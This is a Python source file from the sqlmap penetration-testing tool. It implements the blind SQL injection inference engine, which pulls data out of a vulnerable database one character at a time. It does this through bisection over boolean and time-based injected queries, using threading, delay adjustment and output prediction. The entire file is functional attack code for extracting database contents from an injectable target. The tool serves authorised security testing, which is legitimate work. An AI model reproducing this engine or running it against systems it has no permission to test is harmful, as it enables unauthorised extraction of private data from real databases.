#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re
import threading
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeDbmsHexValue
from lib.core.common import decodeIntToUnicode
from lib.core.common import filterControlChars
from lib.core.common import getCharset
from lib.core.common import getCounter
from lib.core.common import goGoodSamaritan
from lib.core.common import getPartRun
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import safeStringFormat
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import ADJUST_TIME_DELAY
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapThreadException
from lib.core.settings import CHAR_INFERENCE_MARK
from lib.core.settings import INFERENCE_BLANK_BREAK
from lib.core.settings import INFERENCE_UNKNOWN_CHAR
from lib.core.settings import INFERENCE_GREATER_CHAR
from lib.core.settings import INFERENCE_EQUALS_CHAR
from lib.core.settings import INFERENCE_MARKER
from lib.core.settings import INFERENCE_NOT_EQUALS_CHAR
from lib.core.settings import MAX_BISECTION_LENGTH
from lib.core.settings import MAX_REVALIDATION_STEPS
from lib.core.settings import NULL
from lib.core.settings import PARTIAL_HEX_VALUE_MARKER
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.settings import PAYLOAD_DELIMITER
from lib.core.settings import RANDOM_INTEGER_MARKER
from lib.core.settings import VALID_TIME_CHARS_RUN_THRESHOLD
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar
from lib.utils.xrange import xrange

def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
    """
    Bisection algorithm that can be used to perform blind SQL injection
    on an affected host
    """

    abortedFlag = False
    showEta = False
    partialValue = u""
    finalValue = None
    retrievedLength = 0

    if payload is None:
        return 0, None

    if charsetType is None and conf.charset:
        asciiTbl = sorted(set(ord(_) for _ in conf.charset))
    else:
        asciiTbl = getCharset(charsetType)

    threadData = getCurrentThreadData()
    timeBasedCompare = (kb.technique in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED))
    retVal = hashDBRetrieve(expression, checkConf=True)

    if retVal:
        if conf.repair and INFERENCE_UNKNOWN_CHAR in retVal:
            pass
        elif PARTIAL_HEX_VALUE_MARKER in retVal:
            retVal = retVal.replace(PARTIAL_HEX_VALUE_MARKER, "")

            if retVal and conf.hexConvert:
                partialValue = retVal
                infoMsg = "resuming partial value: %s" % safecharencode(partialValue)
                logger.info(infoMsg)
        elif PARTIAL_VALUE_MARKER in retVal:
            retVal = retVal.replace(PARTIAL_VALUE_MARKER, "")

            if retVal and not conf.hexConvert:
                partialValue = retVal
                infoMsg = "resuming partial value: %s" % safecharencode(partialValue)
                logger.info(infoMsg)
        else:
            infoMsg = "resumed: %s" % safecharencode(retVal)
            logger.info(infoMsg)

            return 0, retVal

    try:
        # Set kb.partRun in case "common prediction" feature (a.k.a. "good samaritan") is used or the engine is called from the API
        if conf.predictOutput:
            kb.partRun = getPartRun()
        elif conf.api:
            kb.partRun = getPartRun(alias=False)
        else:
            kb.partRun = None

        if partialValue:
            firstChar = len(partialValue)
        elif re.search(r"(?i)\b(LENGTH|LEN)\(", expression):
            firstChar = 0
        elif (kb.fileReadMode or dump) and conf.firstChar is not None and (isinstance(conf.firstChar, int) or (hasattr(conf.firstChar, "isdigit") and conf.firstChar.isdigit())):
            firstChar = int(conf.firstChar) - 1
            if kb.fileReadMode:
                firstChar <<= 1
        elif hasattr(firstChar, "isdigit") and firstChar.isdigit() or isinstance(firstChar, int):
            firstChar = int(firstChar) - 1
        else:
            firstChar = 0

        if re.search(r"(?i)\b(LENGTH|LEN)\(", expression):
            lastChar = 0
        elif dump and conf.lastChar is not None and (isinstance(conf.lastChar, int) or (hasattr(conf.lastChar, "isdigit") and conf.lastChar.isdigit())):
            lastChar = int(conf.lastChar)
        elif hasattr(lastChar, "isdigit") and lastChar.isdigit() or isinstance(lastChar, int):
            lastChar = int(lastChar)
        else:
            lastChar = 0

        if Backend.getDbms():
            _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
            nulledCastedField = agent.nullAndCastField(fieldToCastStr)
            expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)
            expressionUnescaped = unescaper.escape(expressionReplaced)
        else:
            expressionUnescaped = unescaper.escape(expression)

        if hasattr(length, "isdigit") and length.isdigit() or isinstance(length, int):
            length = int(length)
        else:
            length = None

        if length == 0:
            return 0, ""

        if length and (lastChar > 0 or firstChar > 0):
            length = min(length, lastChar or length) - firstChar

        if length and length > MAX_BISECTION_LENGTH:
            length = None

        showEta = conf.eta and isinstance(length, int)
        numThreads = min(conf.threads or 0, length or 0) or 1

        if showEta:
            progress = ProgressBar(maxValue=length)

        if timeBasedCompare and conf.threads > 1 and not conf.forceThreads:
            warnMsg = "multi-threading is considered unsafe in time-based data retrieval. Going to switch it off automatically"
            singleTimeWarnMessage(warnMsg)

        if numThreads > 1:
            if not timeBasedCompare or conf.forceThreads:
                debugMsg = "starting %d thread%s" % (numThreads, ("s" if numThreads > 1 else ""))
                logger.debug(debugMsg)
            else:
                numThreads = 1

        if conf.threads == 1 and not timeBasedCompare and not conf.predictOutput:
            warnMsg = "running in a single-thread mode. Please consider "
            warnMsg += "usage of option '--threads' for faster data retrieval"
            singleTimeWarnMessage(warnMsg)

        if conf.verbose in (1, 2) and not showEta and not conf.api:
            if isinstance(length, int) and conf.threads > 1:
                dataToStdout("[%s] [INFO] retrieved: %s" % (time.strftime("%X"), "_" * min(length, conf.progressWidth)))
                dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))
            else:
                dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))

        hintlock = threading.Lock()

        def tryHint(idx):
            with hintlock:
                hintValue = kb.hintValue

            if payload is not None and hintValue is not None and len(hintValue) >= idx:
                if Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.ACCESS, DBMS.MAXDB, DBMS.DB2):
                    posValue = hintValue[idx - 1]
                else:
                    posValue = ord(hintValue[idx - 1])

                markingValue = "'%s'" % CHAR_INFERENCE_MARK
                unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
                forgedPayload = agent.extractPayload(payload)
                forgedPayload = safeStringFormat(forgedPayload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, posValue)).replace(markingValue, unescapedCharValue)
                result = Request.queryPage(agent.replacePayload(payload, forgedPayload), timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(kb.technique)

                if result:
                    return hintValue[idx - 1]

            with hintlock:
                kb.hintValue = None

            return None

        def validateChar(idx, value):
            """
            Used in inference - in time-based SQLi if original and retrieved value are not equal there will be a deliberate delay
            """

            validationPayload = re.sub(r"(%s.*?)%s(.*?%s)" % (PAYLOAD_DELIMITER, INFERENCE_GREATER_CHAR, PAYLOAD_DELIMITER), r"\g<1>%s\g<2>" % INFERENCE_NOT_EQUALS_CHAR, payload)

            if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                forgedPayload = safeStringFormat(validationPayload, (expressionUnescaped, idx, value))
            else:
                # e.g.: ... > '%c' -> ... > ORD(..)
                markingValue = "'%s'" % CHAR_INFERENCE_MARK
                unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(value))
                forgedPayload = safeStringFormat(validationPayload, (expressionUnescaped, idx)).replace(markingValue, unescapedCharValue)

            result = not Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)

            if result and timeBasedCompare and kb.injection.data[kb.technique].trueCode:
                result = threadData.lastCode == kb.injection.data[kb.technique].trueCode
                if not result:
                    warnMsg = "detected HTTP code '%s' in validation phase is differing from expected '%s'" % (threadData.lastCode, kb.injection.data[kb.technique].trueCode)
                    singleTimeWarnMessage(warnMsg)

            incrementCounter(kb.technique)

            return result

        def getChar(idx, charTbl=None, continuousOrder=True, expand=charsetType is None, shiftTable=None, retried=None):
            """
            continuousOrder means that distance between each two neighbour's
            numerical values is exactly 1
            """

            result = tryHint(idx)

            if result:
                return result

            if charTbl is None:
                charTbl = type(asciiTbl)(asciiTbl)

            originalTbl = type(charTbl)(charTbl)

            if continuousOrder and shiftTable is None:
                # Used for gradual expanding into unicode charspace
                shiftTable = [2, 2, 3, 3, 5, 4]

            if "'%s'" % CHAR_INFERENCE_MARK in payload:
                for char in ('\n', '\r'):
                    if ord(char) in charTbl:
                        charTbl.remove(ord(char))

            if not charTbl:
                return None

            elif len(charTbl) == 1:
                forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, charTbl[0]))
                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                incrementCounter(kb.technique)

                if result:
                    return decodeIntToUnicode(charTbl[0])
                else:
                    return None

            maxChar = maxValue = charTbl[-1]
            minChar = minValue = charTbl[0]
            firstCheck = False
            lastCheck = False
            unexpectedCode = False

            if continuousOrder:
                while len(charTbl) > 1:
                    position = None

                    if charsetType is None:
                        if not firstCheck:
                            try:
                                try:
                                    lastChar = [_ for _ in threadData.shared.value if _ is not None][-1]
                                except IndexError:
                                    lastChar = None
                                else:
                                    if 'a' <= lastChar <= 'z':
                                        position = charTbl.index(ord('a') - 1)  # 96
                                    elif 'A' <= lastChar <= 'Z':
                                        position = charTbl.index(ord('A') - 1)  # 64
                                    elif '0' <= lastChar <= '9':
                                        position = charTbl.index(ord('0') - 1)  # 47
                            except ValueError:
                                pass
                            finally:
                                firstCheck = True

                        elif not lastCheck and numThreads == 1:  # not usable in multi-threading environment
                            if charTbl[(len(charTbl) >> 1)] < ord(' '):
                                try:
                                    # favorize last char check if current value inclines toward 0
                                    position = charTbl.index(1)
                                except ValueError:
                                    pass
                                finally:
                                    lastCheck = True

                    if position is None:
                        position = (len(charTbl) >> 1)

                    posValue = charTbl[position]
                    falsePayload = None

                    if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                        forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx, posValue))
                        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx, RANDOM_INTEGER_MARKER))
                    else:
                        # e.g.: ... > '%c' -> ... > ORD(..)
                        markingValue = "'%s'" % CHAR_INFERENCE_MARK
                        unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
                        forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, unescapedCharValue)
                        falsePayload = safeStringFormat(payload, (expressionUnescaped, idx)).replace(markingValue, NULL)

                    if timeBasedCompare:
                        if kb.responseTimeMode:
                            kb.responseTimePayload = falsePayload
                        else:
                            kb.responseTimePayload = None

                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                    incrementCounter(kb.technique)

                    if not timeBasedCompare:
                        unexpectedCode |= threadData.lastCode not in (kb.injection.data[kb.technique].falseCode, kb.injection.data[kb.technique].trueCode)
                        if unexpectedCode:
                            warnMsg = "unexpected HTTP code '%s' detected. Will use (extra) validation step in similar cases" % threadData.lastCode
                            singleTimeWarnMessage(warnMsg)

                    if result:
                        minValue = posValue

                        if not isinstance(charTbl, xrange):
                            charTbl = charTbl[position:]
                        else:
                            # xrange() - extended virtual charset used for memory/space optimization
                            charTbl = xrange(charTbl[position], charTbl[-1] + 1)
                    else:
                        maxValue = posValue

                        if not isinstance(charTbl, xrange):
                            charTbl = charTbl[:position]
                        else:
                            charTbl = xrange(charTbl[0], charTbl[position])

                    if len(charTbl) == 1:
                        if maxValue == 1:
                            return None

                        # Going beyond the original charset
                        elif minValue == maxChar:
                            # If the original charTbl was [0,..,127] new one
                            # will be [128,..,(128 << 4) - 1] or from 128 to 2047
                            # and instead of making a HUGE list with all the
                            # elements we use a xrange, which is a virtual
                            # list
                            if expand and shiftTable:
                                charTbl = xrange(maxChar + 1, (maxChar + 1) << shiftTable.pop())
                                originalTbl = xrange(charTbl)
                                maxChar = maxValue = charTbl[-1]
                                minValue = charTbl[0]
                            else:
                                return None
                        else:
                            retVal = minValue + 1

                            if retVal in originalTbl or (retVal == ord('\n') and CHAR_INFERENCE_MARK in payload):
                                if (timeBasedCompare or unexpectedCode) and not validateChar(idx, retVal):
                                    if not kb.originalTimeDelay:
                                        kb.originalTimeDelay = conf.timeSec

                                    threadData.validationRun = 0
                                    if (retried or 0) < MAX_REVALIDATION_STEPS:
                                        errMsg = "invalid character detected. retrying.."
                                        logger.error(errMsg)

                                        if timeBasedCompare:
                                            if kb.adjustTimeDelay is not ADJUST_TIME_DELAY.DISABLE:
                                                conf.timeSec += 1
                                                warnMsg = "increasing time delay to %d second%s" % (conf.timeSec, 's' if conf.timeSec > 1 else '')
                                                logger.warn(warnMsg)

                                            if kb.adjustTimeDelay is ADJUST_TIME_DELAY.YES:
                                                dbgMsg = "turning off time auto-adjustment mechanism"
                                                logger.debug(dbgMsg)
                                                kb.adjustTimeDelay = ADJUST_TIME_DELAY.NO

                                        return getChar(idx, originalTbl, continuousOrder, expand, shiftTable, (retried or 0) + 1)
                                    else:
                                        errMsg = "unable to properly validate last character value ('%s').." % decodeIntToUnicode(retVal)
                                        logger.error(errMsg)
                                        conf.timeSec = kb.originalTimeDelay
                                        return decodeIntToUnicode(retVal)
                                else:
                                    if timeBasedCompare:
                                        threadData.validationRun += 1
                                        if kb.adjustTimeDelay is ADJUST_TIME_DELAY.NO and threadData.validationRun > VALID_TIME_CHARS_RUN_THRESHOLD:
                                            dbgMsg = "turning back on time auto-adjustment mechanism"
                                            logger.debug(dbgMsg)
                                            kb.adjustTimeDelay = ADJUST_TIME_DELAY.YES

                                    return decodeIntToUnicode(retVal)
                            else:
                                return None
            else:
                candidates = list(originalTbl)
                bit = 0
                while len(candidates) > 1:
                    bits = {}
                    for candidate in candidates:
                        bit = 0
                        while candidate:
                            bits.setdefault(bit, 0)
                            bits[bit] += 1 if candidate & 1 else -1
                            candidate >>= 1
                            bit += 1

                    choice = sorted(bits.items(), key=lambda _: abs(_[1]))[0][0]
                    mask = 1 << choice

                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, "&%d%s" % (mask, INFERENCE_GREATER_CHAR)), (expressionUnescaped, idx, 0))
                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                    incrementCounter(kb.technique)

                    if result:
                        candidates = [_ for _ in candidates if _ & mask > 0]
                    else:
                        candidates = [_ for _ in candidates if _ & mask == 0]

                    bit += 1

                if candidates:
                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, candidates[0]))
                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                    incrementCounter(kb.technique)

                    if result:
                        return decodeIntToUnicode(candidates[0])

        # Go multi-threading (--threads > 1)
        if conf.threads > 1 and isinstance(length, int) and length > 1:
            threadData.shared.value = [None] * length
            threadData.shared.index = [firstChar]    # As list for python nested function scoping
            threadData.shared.start = firstChar

            try:
                def blindThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        with kb.locks.index:
                            if threadData.shared.index[0] - firstChar >= length:
                                return

                            threadData.shared.index[0] += 1
                            currentCharIndex = threadData.shared.index[0]

                        if kb.threadContinue:
                            val = getChar(currentCharIndex, asciiTbl, not(charsetType is None and conf.charset))
                            if val is None:
                                val = INFERENCE_UNKNOWN_CHAR
                        else:
                            break

                        with kb.locks.value:
                            threadData.shared.value[currentCharIndex - 1 - firstChar] = val
                            currentValue = list(threadData.shared.value)

                        if kb.threadContinue:
                            if showEta:
                                progress.progress(threadData.shared.index[0])
                            elif conf.verbose >= 1:
                                startCharIndex = 0
                                endCharIndex = 0

                                for i in xrange(length):
                                    if currentValue[i] is not None:
                                        endCharIndex = max(endCharIndex, i)

                                output = ''

                                if endCharIndex > conf.progressWidth:
                                    startCharIndex = endCharIndex - conf.progressWidth

                                count = threadData.shared.start

                                for i in xrange(startCharIndex, endCharIndex + 1):
                                    output += '_' if currentValue[i] is None else filterControlChars(currentValue[i] if len(currentValue[i]) == 1 else ' ', replacement=' ')

                                for i in xrange(length):
                                    count += 1 if currentValue[i] is not None else 0

                                if startCharIndex > 0:
                                    output = ".." + output[2:]

                                if (endCharIndex - startCharIndex == conf.progressWidth) and (endCharIndex < length - 1):
                                    output = output[:-2] + ".."

                                if conf.verbose in (1, 2) and not showEta and not conf.api:
                                    _ = count - firstChar
                                    output += '_' * (min(length, conf.progressWidth) - len(output))
                                    status = ' %d/%d (%d%%)' % (_, length, int(100.0 * _ / length))
                                    output += status if _ != length else " " * len(status)

                                    dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), output))

                runThreads(numThreads, blindThread, startThreadMsg=False)

            except KeyboardInterrupt:
                abortedFlag = True

            finally:
                value = [_ for _ in partialValue]
                value.extend(_ for _ in threadData.shared.value)

            infoMsg = None

            # If we have got one single character not correctly fetched it
            # can mean that the connection to the target URL was lost
            if None in value:
                partialValue = "".join(value[:value.index(None)])

                if partialValue:
                    infoMsg = "\r[%s] [INFO] partially retrieved: %s" % (time.strftime("%X"), filterControlChars(partialValue))
            else:
                finalValue = "".join(value)
                infoMsg = "\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), filterControlChars(finalValue))

            if conf.verbose in (1, 2) and not showEta and infoMsg and not conf.api:
                dataToStdout(infoMsg)

        # No multi-threading (--threads = 1)
        else:
            index = firstChar
            threadData.shared.value = ""

            while True:
                index += 1

                # Common prediction feature (a.k.a. "good samaritan")
                # NOTE: to be used only when multi-threading is not set for
                # the moment
                if conf.predictOutput and len(partialValue) > 0 and kb.partRun is not None:
                    val = None
                    commonValue, commonPattern, commonCharset, otherCharset = goGoodSamaritan(partialValue, asciiTbl)

                    # If there is one single output in common-outputs, check
                    # it via equal against the query output
                    if commonValue is not None:
                        # One-shot query containing equals commonValue
                        testValue = unescaper.escape("'%s'" % commonValue) if "'" not in commonValue else unescaper.escape("%s" % commonValue, quote=False)

                        query = kb.injection.data[kb.technique].vector
                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)%s%s" % (expressionUnescaped, INFERENCE_EQUALS_CHAR, testValue)))
                        query = agent.suffixQuery(query)

                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(kb.technique)

                        # Did we have luck?
                        if result:
                            if showEta:
                                progress.progress(len(commonValue))
                            elif conf.verbose in (1, 2) or conf.api:
                                dataToStdout(filterControlChars(commonValue[index - 1:]))

                            finalValue = commonValue
                            break

                    # If there is a common pattern starting with partialValue,
                    # check it via equal against the substring-query output
                    if commonPattern is not None:
                        # Substring-query containing equals commonPattern
                        subquery = queries[Backend.getIdentifiedDbms()].substring.query % (expressionUnescaped, 1, len(commonPattern))
                        testValue = unescaper.escape("'%s'" % commonPattern) if "'" not in commonPattern else unescaper.escape("%s" % commonPattern, quote=False)

                        query = kb.injection.data[kb.technique].vector
                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)=%s" % (subquery, testValue)))
                        query = agent.suffixQuery(query)

                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(kb.technique)

                        # Did we have luck?
                        if result:
                            val = commonPattern[index - 1:]
                            index += len(val) - 1

                    # Otherwise if there is no commonValue (single match from
                    # txt/common-outputs.txt) and no commonPattern
                    # (common pattern) use the returned common charset only
                    # to retrieve the query output
                    if not val and commonCharset:
                        val = getChar(index, commonCharset, False)

                    # If we had no luck with commonValue and common charset,
                    # use the returned other charset
                    if not val:
                        val = getChar(index, otherCharset, otherCharset == asciiTbl)
                else:
                    val = getChar(index, asciiTbl, not(charsetType is None and conf.charset))

                if val is None:
                    finalValue = partialValue
                    break

                if kb.data.processChar:
                    val = kb.data.processChar(val)

                threadData.shared.value = partialValue = partialValue + val

                if showEta:
                    progress.progress(index)
                elif conf.verbose in (1, 2) or conf.api:
                    dataToStdout(filterControlChars(val))

                # some DBMSes (e.g. Firebird, DB2, etc.) have issues with trailing spaces
                if Backend.getIdentifiedDbms() in (DBMS.FIREBIRD, DBMS.DB2, DBMS.MAXDB) and len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace():
                    finalValue = partialValue[:-INFERENCE_BLANK_BREAK]
                    break
                elif charsetType and partialValue[-1:].isspace():
                    finalValue = partialValue[:-1]
                    break

                if (lastChar > 0 and index >= lastChar):
                    finalValue = "" if length == 0 else partialValue
                    finalValue = finalValue.rstrip() if len(finalValue) > 1 else finalValue
                    partialValue = None
                    break

    except KeyboardInterrupt:
        abortedFlag = True
    finally:
        kb.prependFlag = False
        retrievedLength = len(finalValue or "")

        if finalValue is not None:
            finalValue = decodeDbmsHexValue(finalValue) if conf.hexConvert else finalValue
            hashDBWrite(expression, finalValue)
        elif partialValue:
            hashDBWrite(expression, "%s%s" % (PARTIAL_VALUE_MARKER if not conf.hexConvert else PARTIAL_HEX_VALUE_MARKER, partialValue))

    if conf.hexConvert and not abortedFlag and not conf.api:
        infoMsg = "\r[%s] [INFO] retrieved: %s  %s\n" % (time.strftime("%X"), filterControlChars(finalValue), " " * retrievedLength)
        dataToStdout(infoMsg)
    else:
        if conf.verbose in (1, 2) and not showEta and not conf.api:
            dataToStdout("\n")

        if (conf.verbose in (1, 2) and showEta) or conf.verbose >= 3:
            infoMsg = "retrieved: %s" % filterControlChars(finalValue)
            logger.info(infoMsg)

    if kb.threadException:
        raise SqlmapThreadException("something unexpected happened inside the threads")

    if abortedFlag:
        raise KeyboardInterrupt

    _ = finalValue or partialValue

    return getCounter(kb.technique), safecharencode(_) if kb.safeCharEncode else _

def queryOutputLength(expression, payload):
    """
    Returns the query output length.
    """

    infoMsg = "retrieving the length of query output"
    logger.info(infoMsg)

    start = time.time()

    lengthExprUnescaped = agent.forgeQueryOutputLength(expression)
    count, length = bisection(payload, lengthExprUnescaped, charsetType=CHARSET_TYPE.DIGITS)

    debugMsg = "performed %d queries in %.2f seconds" % (count, calculateDeltaSeconds(start))
    logger.debug(debugMsg)

    if length == " ":
        length = 0

    return length
